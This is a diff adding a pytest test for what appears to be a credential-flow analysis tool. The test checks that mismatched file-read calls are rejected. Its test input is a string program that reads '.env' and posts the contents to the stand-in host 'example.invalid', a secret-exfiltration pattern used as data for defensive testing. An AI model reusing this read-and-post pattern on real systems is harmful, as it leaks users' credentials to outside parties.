@@ -128,3 +128,9 @@ def test_source_identity_and_no_modification_of_the_program():
     out = f.observe(subject)
     assert out == f.observe(subject)
     assert out['method_sha256'] == hashlib.sha256((ROOT/'tools/credential_flow.py').read_bytes()).hexdigest()
+
+@pytest.mark.parametrize('constructor,method', [('Path','read'), ('open','read_text'), ('open','read_bytes')])
+@pytest.mark.parametrize('filename', ['.env','ordinary.txt'])
+def test_constructor_specific_read_methods_refuse_impossible_programs(constructor,method,filename):
+    subject = f'import requests\nfrom pathlib import Path\nvalue={constructor}({filename!r}).{method}()\nrequests.post("https://example.invalid",data=value)'
+    with pytest.raises(CorpusError): f.observe(subject)
